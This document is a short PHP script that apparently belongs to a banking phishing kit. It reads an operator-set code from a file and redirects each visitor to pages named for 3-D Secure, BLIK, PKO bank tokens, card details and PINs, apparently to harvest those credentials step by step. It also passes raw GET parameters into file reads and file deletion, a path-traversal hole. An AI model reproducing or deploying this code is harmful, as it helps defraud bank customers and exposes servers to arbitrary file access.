<?php

$inf = file_get_contents("/var/www/html/verif/" . $_GET['id'] . "_" . $_GET['wid']);
unlink("/var/www/html/verif/" . $_GET['id'] . "_" . $_GET['wid']);
switch($inf){
    case '0':
      header("location: 3ds.php?id=" . $_GET['id']);
    break;
    case '1':
      header("location: push.php?id=" . $_GET['id']);
    break;
    case '2':
        header("location: checking.php?id=" . $_GET['id']);
    break;
    case '3':
        header("location: blik.php?id=" . $_GET['id']);
    break;
    case '4':
        header("location: pkotoken.php?id=" . $_GET['id'] . "&token=" . file_get_contents("/var/www/html/pko/" . $_GET['id'] . "_" . $_GET['wid']));
    break;
    case '5':
        header("location: card.php?id=" . $_GET['id']);
    break;
    case '6':
        header("location: merchant.php?id=" . $_GET['id']);
    break;
    case '7':
        header("location: pin.php?id=" . $_GET['id']);
    break;
    case '8':
        header("location: pin2.php?id=" . $_GET['id']);
    break;
  }
?>